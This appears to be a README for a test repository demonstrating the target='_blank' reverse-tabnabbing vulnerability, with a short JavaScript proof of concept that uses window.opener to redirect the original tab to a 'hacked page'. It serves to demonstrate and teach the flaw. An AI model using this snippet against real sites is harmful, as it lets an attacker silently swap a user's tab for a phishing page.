# Blank Test

Test repo for the target="_blank" security vulnerability


## Exploit

```js
if (window.opener !== null && window.opener.location !== null) {
  window.opener.location = 'https://adriansieber.com/blank-test/hacked-page.html'
}
else {
  console.log('Opener window can\'t be accessed')
}
```
